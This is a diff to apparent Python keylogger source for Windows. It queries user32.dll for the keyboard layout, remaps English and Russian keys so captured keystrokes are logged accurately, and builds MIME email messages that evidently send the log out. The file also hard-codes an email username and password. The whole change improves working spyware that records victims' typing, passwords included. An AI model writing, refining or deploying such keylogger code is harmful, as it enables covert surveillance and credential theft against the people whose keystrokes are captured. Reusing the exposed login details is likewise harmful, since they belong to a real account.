@@ -11,13 +11,14 @@ interval = 10
 password = "8Deg4tEm0pzF21dstxNr"
 username = "shro_experiment@mail.ru"
 
-en = "qwertyuiop[]asdfghjkl;'zxcvbnm,."
-ru = "йцукенгшщзхъфывапролджэячсмитьбю"
+en = "qwertyuiop[]asdfghjkl;'" + 'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?'
+ru = "йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,"
 enru = {}
 ruen = {}
-for i in range(32):
+for i in range(64):
     enru[en[i]] = ru[i]
     ruen[ru[i]] = en[i]
+
 
 u = ctypes.windll.LoadLibrary("user32.dll")
 pf = getattr(u, "GetKeyboardLayout")
@@ -55,20 +56,17 @@ class Keylogger:
                 name = " "
             elif name == "enter":
                 name = "[enter]\n"
-            elif name == "decimal":
-                name = "."
             elif name == "alt gr":
                 name = ""
             else:
                 name = f"[{name}]"
             self.log += name
         elif len(name) == 1:
-            if (layout == 'en' and name in list(enru.keys())) or (layout == 'ru' and name in list(ruen.keys())):
-                self.log += name
-            elif layout == 'ru' and name in list(enru.keys()):
-                self.log += enru[name]
+            if layout == 'ru' and name in list(enru.keys()):
+                name = enru[name]
             elif layout == 'en' and name in list(ruen.keys()):
-                self.log += ruen[name]
+                name = ruen[name]
+            self.log += name
 
     def form_message(self, email, message):
         msg = MIMEMultipart()
